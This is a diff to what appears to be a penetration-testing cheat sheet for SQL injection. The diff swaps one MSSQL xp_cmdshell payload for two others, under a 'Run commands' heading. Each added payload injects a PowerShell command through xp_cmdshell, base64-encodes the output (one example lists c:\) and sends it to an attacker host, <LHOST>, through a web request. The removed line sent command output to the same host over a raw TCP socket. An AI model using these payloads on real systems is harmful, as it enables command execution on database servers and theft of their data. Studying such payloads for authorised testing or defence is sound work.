@@ -2905,7 +2905,9 @@ LOAD_FILE('/etc/httpd/conf/httpd.conf')
 
 ##### Run commands
 ```c
-' EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''/<LHOST>'',9001); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine((<command>)); $writer.Flush(); $writer.Close(); $client.Close()"' ;--
+' EXEC xp_cmdshell 'powershell -c "$out = <CMD Command> | Out-String; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out)); Invoke-WebRequest -Uri http://<LHOST>/?data=$encoded -UseBasicParsing"' ;--
+' EXEC xp_cmdshell 'powershell -c "$out = dir c:\ | Out-String; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out)); Invoke-WebRequest -Uri http://<LHOST>/?data=$encoded -UseBasicParsing"' ;--
+
 ```
 
 ##### Orcale SQL
